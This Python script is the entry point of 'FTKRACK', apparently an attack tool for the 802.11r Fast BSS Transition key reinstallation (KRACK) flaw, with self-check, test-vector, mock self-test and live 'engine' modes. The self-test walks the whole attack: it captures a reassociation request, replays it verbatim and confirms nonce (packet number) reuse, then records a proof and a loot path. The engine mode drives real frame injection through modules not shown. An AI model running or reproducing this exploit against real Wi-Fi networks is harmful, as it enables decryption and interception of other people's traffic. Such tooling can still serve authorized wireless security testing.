#!/usr/bin/env python3
"""FTKRACK entry point.

Usage:
    python3 ftkrack.py capcheck     # stdlib + protocol self-check
    python3 ftkrack.py selftest     # end-to-end engine run with MockInjector
    python3 ftkrack.py vectors      # known-answer vectors
    python3 ftkrack.py engine       # command-driven engine (used by payload.sh)
"""

from __future__ import annotations

import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

from ft import capture, dot11, engine, inject  # noqa: E402


AP = bytes.fromhex("a45e60112233")
STA = bytes.fromhex("3c71bfaabbcc")
CURRENT_AP = bytes.fromhex("a45e60114444")
SSID = "CORP-FT"
MDID = 0x1234


def _demo_frames():
    req = dot11.build_reassoc_req(AP, STA, CURRENT_AP, SSID, mdid=MDID)
    resp = dot11.build_reassoc_resp(AP, STA, status=0, aid=2)
    before = [dot11.build_ccmp_data(AP, STA, STA, pn) for pn in (9000, 9001, 9002)]
    # After PTK/TK reinstallation the AP restarts its TX PN at used values.
    after = [dot11.build_ccmp_data(AP, STA, STA, pn) for pn in (1, 2, 9000)]
    return req, resp, before, after


def capcheck() -> int:
    ok = True
    req, resp, before, after = _demo_frames()
    rt = dot11.build_radiotap_inject()

    parsed_rt = dot11.parse_radiotap(rt)
    strip = dot11.strip_radiotap(dot11.build_capture_buffer(req))
    frame = dot11.parse_dot11(strip[0]) if strip[0] else None
    parsed_req = dot11.parse_reassoc_req(frame) if frame else None
    parsed_resp = dot11.parse_reassoc_resp(
        dot11.parse_dot11(resp)) if resp else None
    pn_frame = dot11.parse_ccmp_data(dot11.parse_dot11(before[0]))

    checks = {
        "radiotap-inject-build": rt == b"\x00\x00\x08\x00\x00\x00\x00\x00",
        "radiotap-no-present-fields": bool(parsed_rt and parsed_rt["present"][0] == 0),
        "radiotap-strip": strip[0] == req,
        "ftie-parse": bool(parsed_req and parsed_req["ft_valid"]),
        "mdie-id": parsed_req["mdie"]["mdid"] == MDID if parsed_req else False,
        "reassoc-resp": bool(parsed_resp and parsed_resp["success"]),
        "ccmp-pn": pn_frame["pn"] == 9000 if pn_frame else False,
        "replay-prefix": (dot11.build_radiotap_inject() + req)[8:] == req,
        "inject-api": all(hasattr(inject.MonitorInjector, name)
                          for name in ("open", "recv_frame", "inject", "close")),
    }
    for name, value in checks.items():
        print(f"{name}: {value}")
        if isinstance(value, bool) and not value:
            ok = False
    print("capcheck:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


def vectors() -> int:
    req, resp, before, _after = _demo_frames()
    parsed = dot11.parse_reassoc_req(dot11.parse_dot11(req))
    assert parsed is not None
    f = parsed["ftie"]
    assert f is not None
    print("FTKRACK known-answer vectors")
    print(f"  radiotap injection header {dot11.build_radiotap_inject().hex()}")
    print(f"  reassoc request ({len(req)} bytes) {req.hex()}")
    print(f"  reassoc response ({len(resp)} bytes) {resp.hex()}")
    print(f"  MDIE id=54 raw {parsed['mdie']['raw'].hex() if parsed['mdie'] else ''} (3 bytes)")
    print(f"  FTIE id=55 MIC control={f['mic_control']:#06x}")
    print(f"  FTIE MIC    {f['mic'].hex()}")
    print(f"  FTIE SNonce {f['snonce'].hex()}")
    print(f"  FTIE ANonce {f['anonce'].hex()}")
    pn_frame = dot11.parse_ccmp_data(dot11.parse_dot11(before[0]))
    print(f"  CCMP PN 9000 -> {before[0][24 + 2:24 + 2 + 8].hex()} "
          f"(parsed={pn_frame['pn'] if pn_frame else None})")
    return 0


def selftest() -> int:
    """End-to-end attack against a mocked monitor interface.  No hardware."""
    req, resp, before, after = _demo_frames()
    feeds = ([dot11.build_capture_buffer(req)] +
             [dot11.build_capture_buffer(f) for f in before])
    mock = inject.MockInjector(feeds=feeds, inject_ok=True)

    eng = engine.Engine(
        injector=mock,
        state_path="/tmp/ftkrack_selftest_state.json",
        cmd_path="/tmp/ftkrack_selftest_cmd.jsonl",
        loot="/tmp/ftkrack_selftest_loot",
    )
    eng.handle({"cmd": "authorize"})
    eng.handle({"cmd": "monitor"})
    for buf in list(feeds):
        eng.feed(buf)

    # Refuse to replay before a valid FT capture exists: separate engine.
    empty = engine.Engine(injector=inject.MockInjector(feeds=[], inject_ok=True),
                          state_path="/tmp/ftkrack_selftest_empty_state.json",
                          cmd_path="/tmp/ftkrack_selftest_empty_cmd.jsonl",
                          loot="/tmp/ftkrack_selftest_empty_loot")
    empty.handle({"cmd": "authorize"})
    empty.handle({"cmd": "replay", "count": 3})
    if empty.state["replay"]["frames"] or empty.capture.proof()["confirmed"]:
        print("selftest: FAIL (replay without capture was accepted)")
        return 1

    eng.handle({"cmd": "replay", "count": 3})
    injected = list(mock.injected)
    if len(injected) != 3 or any(x[8:] != req for x in injected):
        print("selftest: FAIL (replay frame was not verbatim)")
        return 1

    eng.feed(dot11.build_capture_buffer(resp))
    for frame in after:
        eng.feed(dot11.build_capture_buffer(frame))
    eng.handle({"cmd": "verify"})

    proof = eng.state["proof"]
    print(f"capture={eng.state['capture']['captured']} "
          f"replay_frames={eng.state['replay']['frames']} "
          f"response={eng.state['response']['count']} "
          f"pn_reuse={eng.state['pn']['reuse_exact']} "
          f"confirmed={proof['confirmed']}")
    if not proof["confirmed"]:
        print("selftest: FAIL (proof not confirmed: " + proof["detail"] + ")")
        return 1
    print("selftest: PASS")
    return 0


def main() -> int:
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    cmd = sys.argv[1]
    if cmd == "capcheck":
        return capcheck()
    if cmd == "vectors":
        return vectors()
    if cmd == "selftest":
        return selftest()
    if cmd == "engine":
        engine.Engine().run()
        return 0
    print("unknown command:", cmd)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
